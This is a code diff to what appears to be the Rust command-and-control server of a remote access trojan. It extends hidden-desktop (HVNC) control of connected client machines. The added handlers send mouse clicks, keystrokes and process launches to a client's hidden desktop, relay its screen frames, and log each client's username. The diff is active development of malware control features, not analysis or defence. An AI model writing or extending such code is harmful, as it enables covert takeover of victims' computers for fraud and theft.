@@ -375,10 +375,10 @@ impl ServerWrapper {
                         .await
                 }
 
-                StartHVNC(addr) => {
+                StartHVNC(addr, config) => {
                     if let Some(client) = self.connected_users.get(&addr) {
                         self.log_events.log("cmd_sent", format!("Starting HVNC on client [{}] [{}]", addr, client.system.username)).await;
-                        self.send_client_packet(&addr, ClientboundPacket::StartHVNC).await  
+                        self.send_client_packet(&addr, ClientboundPacket::StartHVNC(config)).await
                     }
                 }
                 StopHVNC(addr) => {
@@ -387,8 +387,16 @@ impl ServerWrapper {
                         self.send_client_packet(&addr, ClientboundPacket::StopHVNC).await  
                     }
                 }
-                OpenExplorer(addr) => {
-                    self.send_client_packet(&addr, ClientboundPacket::OpenExplorer)
+                HVNCMouseClick(addr, data) => {
+                    self.send_client_packet(&addr, ClientboundPacket::HVNCMouseClick(data))
+                        .await
+                }
+                HVNCKeyboardInput(addr, data) => {
+                    self.send_client_packet(&addr, ClientboundPacket::HVNCKeyboardInput(data))
+                        .await
+                }
+                HVNCStartProcess(addr, path) => {
+                    self.send_client_packet(&addr, ClientboundPacket::HVNCStartProcess(path))
                         .await
                 }
 
@@ -413,11 +421,12 @@ impl ServerWrapper {
                     }
                 },
 
-                HVNCFrame(addr, data) => {
-                    println!("HVNCFrame received from {}", addr);
+                HVNCFrame(addr, frame) => {
                     self.emit_serde_payload("hvnc_frame", serde_json::json!({
                         "addr": addr.to_string(),
-                        "data": general_purpose::STANDARD.encode(&data)
+                        "width": frame.width,
+                        "height": frame.height,
+                        "data": general_purpose::STANDARD.encode(&frame.data)
                     })).await;
                 },
 
